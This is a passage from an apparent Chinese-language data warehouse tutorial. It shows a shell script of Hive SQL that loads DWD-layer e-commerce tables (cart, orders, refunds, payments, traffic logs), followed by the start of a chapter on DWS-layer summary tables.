partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type_code,</p><p>source_type_name,</p><p>sku_num</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(from_utc_timestamp(ts*1000,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts*1000,’GMT+8’),’yyyy-MM-dd HH:mm:ss’)<br>create_time,</p><p>data.source_id,</p><p>data.source_type source_type_code,</p><p>if(type=’insert’,data.sku_num,data.sku_num-old[‘sku_num’]) sku_num</p><p>from ${APP}.ods_cart_info_inc</p><p>where dt=’$do_date’</p><p>and (type=’insert’</p><p>or(type=’update’ and old[‘sku_num’] is not null and<br>data.sku_num&gt;cast(old[‘sku_num’] as int)))</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name source_type_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on cart.source_type_code=dic.dic_code;</p><p>“</p><p>dwd_trade_cart_full=”</p><p>insert overwrite table ${APP}.dwd_trade_cart_full partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ${APP}.ods_cart_info_full</p><p>where dt=’$do_date’</p><p>and is_ordered=’0’;</p><p>“</p><p>dwd_trade_order_detail_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_order_detail_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>date_format(data.create_time, ‘yyyy-MM-dd’) date_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘insert’</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>“</p><p>dwd_trade_order_refund_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_order_refund_inc<br>partition(dt=’$do_date’)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=’$do_date’</p><p>and type=’insert’</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and data.order_status=’1005’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code = ‘15’</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code = ‘13’</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><p>“</p><p>dwd_trade_pay_detail_suc_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_pay_detail_suc_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where (dt = ‘$do_date’ or dt = date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ${APP}.ods_payment_info_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’payment_status’)</p><p>and data.payment_status=’1602’</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where (dt = ‘$do_date’ or dt = date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where (dt = ‘$do_date’ or dt = date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where (dt = ‘$do_date’ or dt = date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type = ‘bootstrap-insert’)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’11’</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p>“</p><p>dwd_trade_refund_pay_suc_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_refund_pay_suc_inc<br>partition(dt=’$do_date’)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ${APP}.ods_refund_payment_inc</p><p>where dt=’$do_date’</p><p>and type = ‘update’</p><p>and array_contains(map_keys(old),’refund_status’)</p><p>and data.refund_status=’1602’</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and data.order_status=’1006’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and data.refund_status=’0705’</p><p>and array_contains(map_keys(old),’refund_status’)</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’11’</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><p>“</p><p>dwd_traffic_action_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_action_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ${APP}.ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=’$do_date’</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_display_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_display_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.\`order\` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ${APP}.ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=’$do_date’</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_error_inc=”</p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table ${APP}.dwd_traffic_error_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and err is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>set hive.execution.engine=spark;</p><p>“</p><p>dwd_traffic_page_view_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_page_view_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) view_time,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_start_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_start_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and \`start\` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_user_login_inc=”</p><p>insert overwrite table ${APP}.dwd_user_login_inc partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><p>“</p><p>dwd_user_register_inc=”</p><p>insert overwrite table ${APP}.dwd_user_register_inc partition(dt=’$do_date’)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=’$do_date’</p><p>and type=’insert’</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page.page_id=’register’</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>case $1 in</p><p>“dwd_interaction_comment_inc” )</p><p>hive -e “$dwd_interaction_comment_inc”</p><p>;;</p><p>“dwd_interaction_favor_add_inc” )</p><p>hive -e “$dwd_interaction_favor_add_inc”</p><p>;;</p><p>“dwd_tool_coupon_get_inc” )</p><p>hive -e “$dwd_tool_coupon_get_inc”</p><p>;;</p><p>“dwd_tool_coupon_order_inc” )</p><p>hive -e “$dwd_tool_coupon_order_inc”</p><p>;;</p><p>“dwd_tool_coupon_pay_inc” )</p><p>hive -e “$dwd_tool_coupon_pay_inc”</p><p>;;</p><p>“dwd_trade_cancel_detail_inc” )</p><p>hive -e “$dwd_trade_cancel_detail_inc”</p><p>;;</p><p>“dwd_trade_cart_add_inc” )</p><p>hive -e “$dwd_trade_cart_add_inc”</p><p>;;</p><p>“dwd_trade_cart_full” )</p><p>hive -e “$dwd_trade_cart_full”</p><p>;;</p><p>“dwd_trade_order_detail_inc” )</p><p>hive -e “$dwd_trade_order_detail_inc”</p><p>;;</p><p>“dwd_trade_order_refund_inc” )</p><p>hive -e “$dwd_trade_order_refund_inc”</p><p>;;</p><p>“dwd_trade_pay_detail_suc_inc” )</p><p>hive -e “$dwd_trade_pay_detail_suc_inc”</p><p>;;</p><p>“dwd_trade_refund_pay_suc_inc” )</p><p>hive -e “$dwd_trade_refund_pay_suc_inc”</p><p>;;</p><p>“dwd_traffic_action_inc” )</p><p>hive -e “$dwd_traffic_action_inc”</p><p>;;</p><p>“dwd_traffic_display_inc” )</p><p>hive -e “$dwd_traffic_display_inc”</p><p>;;</p><p>“dwd_traffic_error_inc” )</p><p>hive -e “$dwd_traffic_error_inc”</p><p>;;</p><p>“dwd_traffic_page_view_inc” )</p><p>hive -e “$dwd_traffic_page_view_inc”</p><p>;;</p><p>“dwd_traffic_start_inc” )</p><p>hive -e “$dwd_traffic_start_inc”</p><p>;;</p><p>“dwd_user_login_inc” )</p><p>hive -e “$dwd_user_login_inc”</p><p>;;</p><p>“dwd_user_register_inc” )</p><p>hive -e “$dwd_user_register_inc”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dwd_interaction_comment_inc$dwd_interaction_favor_add_inc$dwd_tool_coupon_get_inc$dwd_tool_coupon_order_inc$dwd_tool_coupon_pay_inc$dwd_trade_cancel_detail_inc$dwd_trade_cart_add_inc$dwd_trade_cart_full$dwd_trade_order_detail_inc$dwd_trade_order_refund_inc$dwd_trade_pay_detail_suc_inc$dwd_trade_refund_pay_suc_inc$dwd_traffic_action_inc$dwd_traffic_display_inc$dwd_traffic_error_inc$dwd_traffic_page_view_inc$dwd_traffic_start_inc$dwd_user_login_inc$dwd_user_register_inc”</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dwd.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ ods_to_dwd.sh all 2020-06-14</p><h2 id="第10章-数仓开发之DWS层"><a href="#第10章-数仓开发之DWS层" class="headerlink" title="第10章 数仓开发之DWS层"></a>第10章 数仓开发之DWS层</h2><p>设计要点：</p><p>1）DWS层的设计参考指标体系。</p><p>2）DWS层的数据存储格式为orc列式存储+snappy压缩。</p><p>3）DWS层表名的命名规范为dws_数据域_统计粒度_业务过程_统计周期（1d/nd/td）</p><p>注：1d表示最近1日，nd表示最近n日，td表示历史至今。</p><h3 id="最近1日汇总表"><a href="#最近1日汇总表" class="headerlink" title="最近1日汇总表"></a>最近1日汇总表</h3><h4 id="交易域用户商品粒度订单最近1日汇总表"><a href="#交易域用户商品粒度订单最近1日汇总表" class="headerlink" title="交易域用户商品粒度订单最近1日汇总表"></a>交易域用户商品粒度订单最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`sku_name` STRING COMMENT ‘sku名称’,</p><p>`category1_id` STRING COMMENT ‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘一级分类id’,</p><p>`category2_name` STRING COMMENT ‘一级分类名称’,</p><p>`category3_id` STRING COMMENT ‘一级分类id’,</p><p>`category3_name` STRING COMMENT ‘一级分类名称’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_count_1d` BIGINT COMMENT ‘最近1日下单次数’,</p><p>`order_num_1d` BIGINT COMMENT ‘最近1日下单件数’,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单原始金额’,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日活动优惠金额’,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日优惠券优惠金额’,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT ‘最近1日下单最终金额’</p><p>) COMMENT ‘交易域用户商品粒度订单最近1日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_sku_order_1d’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_sku_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count_1d,</p><p>sum(sku_num) order_num_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0.0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0.0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from dwd_trade_order_detail_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=’2020-06-14’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dws_trade_user_sku_order_1d partition(dt=’2020-06-15’)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count,</p><p>order_num,</p><p>order_original_amount,</p><p>activity_reduce_amount,</p><p>coupon_reduce_amount,</p><p>order_total_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count,</p><p>sum(sku_num) order_num,</p><p>sum(split_original_amount) order_original_amount,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount,</p><p>sum(split_total_amount) order_total_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt=’2020-06-15’</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=’2020-06-15’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><h4 id="交易域用户商品粒度退单最近1日汇总表"><a href="#交易域用户商品粒度退单最近1日汇总表" class="headerlink" title="交易域用户商品粒度退单最近1日汇总表"></a>交易域用户商品粒度退单最近1日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_refund_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_refund_1d</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`sku_name` STRING COMMENT ‘sku名称’,</p><p>`category1_id` STRING COMMENT 